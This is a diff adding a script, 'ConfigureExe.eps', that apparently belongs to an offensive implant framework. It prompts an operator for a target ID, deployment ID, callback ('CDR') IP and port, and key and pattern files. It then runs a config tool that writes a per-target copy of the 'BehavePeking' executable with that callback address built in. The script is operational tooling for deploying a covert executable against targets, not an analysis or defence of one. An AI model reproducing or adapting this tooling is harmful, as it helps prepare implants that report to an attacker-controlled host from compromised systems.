@@ -1,0 +1,85 @@
+#-----------------------------------------------------------------------------
+# File: ConfigureExe.eps
+#
+#  Configures the BehavePeking executable
+#-----------------------------------------------------------------------------
+
+@echo off;
+
+if ($argc != 1) {
+	echo "Usage: $argv[0]";
+	return false;
+}
+
+string $basicExe = "BehavePeking.ex_";
+string $configTool = "BehavePekingConfig.exe";
+
+@record on;
+
+# get full path to original file
+ifnot (`getdirectory -resources`) {
+	echo "* ConfigureExecutable: Unable to get resources directory";
+	return false;
+}
+
+string $resDir = GetCmdData("dir");
+ifnot (defined($resDir[0])) {
+	echo "* ConfigureExecutable: Unable to retrieve resources directory";
+	return false;
+}
+
+# get logs directory
+ifnot (`getdirectory -logs`) {
+	echo "* ConfigureExecutable: Unable to get logs directory";
+	return false;
+}
+
+string $logsDir = GetCmdData("dir");
+ifnot (defined($logsDir[0])) {
+	echo "* ConfigureExecutable: Unable to retrieve logs directory";
+	return false;
+}
+
+@hex on;
+string $cdrIp;
+int $cdrPort;
+string $patternFile = "$resDir\\BehavePeking\\Patterns.xml";
+string $keyFile = "$resDir\\BehavePeking\\BehavePeking.key";
+int $targetId;
+int $deployId;
+bool $correct = false;
+while ($correct == false) {
+    $targetId = GetInput("Enter the target ID");
+    $deployId = GetInput("Enter the deployment ID");
+    $cdrIp = GetInput("Enter the CDR IP");
+    $cdrPort = GetInput("Enter the CDR Port");
+    ifnot (prompt "Use the default pattern file?") {
+	$patternFile = GetInput("Enter the location of the pattern file");
+    }
+    ifnot (prompt "Use the default CDR key file?") {
+	$keyFile = GetInput("Enter the location of the CDR key file");
+    }
+
+    echo "";
+    echo "   Target ID : $targetId";
+    echo "   Deploy ID : $deployId";
+    echo "         CDR : $cdrIp : $cdrPort";
+    echo "Pattern File : $patternFile";
+    echo "    Key File : $keyFile";
+    echo "";
+    $correct = prompt "Is this correct?";
+}
+
+# set new filename
+string $newFileName = "$logsDir\\$basicExe-$targetid-$deployId-$cdrIp-$cdrPort";
+
+# configure the exe
+@echo on;
+ifnot (`local run -command "\\"$resDir\\BehavePeking\\Tools\\$configTool\\" -srcfile \\"$resDir\\BehavePeking\\$basicExe\\" -dstfile \\"$newFileName\\" -target $cdrIp $cdrPort -targetid $targetId -deploymentid $deployid -keyfile \\"$keyFile\\" -patternfile \\"$patternFile\\"" -redirect`) {
+	echo "* ConfigureExecutable: Configure failed";
+	return false;
+}
+
+echo "Exe configured ($newFileName)";
+return SetCmdData(STRING, "file", $newFileName);
+return true;
